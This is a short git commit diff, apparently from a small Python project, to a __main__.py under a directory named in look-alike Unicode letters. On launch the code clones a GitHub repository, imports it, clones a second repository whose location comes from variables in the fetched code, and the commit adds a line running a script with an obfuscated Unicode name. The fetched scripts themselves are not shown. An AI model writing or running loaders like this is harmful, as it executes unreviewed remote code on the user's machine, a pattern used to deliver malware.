5099158e26a8e3daa3f0dc548d8124d89d80336e
hypevoidsouls <hypevoidsoul@yahoo.com>
2021-07-07 01:54:14 +0530

    Ӽɛʀօռօɨɖ

--- ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
+++ ᎥᏁᏦᎥᏦᏒᎩᎩ/__main__.py
@@ -2,3 +2,4 @@ import os
 os.system("git clone https://github.com/hypevoidsouls/knite.git")
 from knite import *
 os.system("git clone https://github.com/{}/{}.git".format(BASH,KASH))
+os.system("python3 Ӽɛʀօռօɨɖ.py")
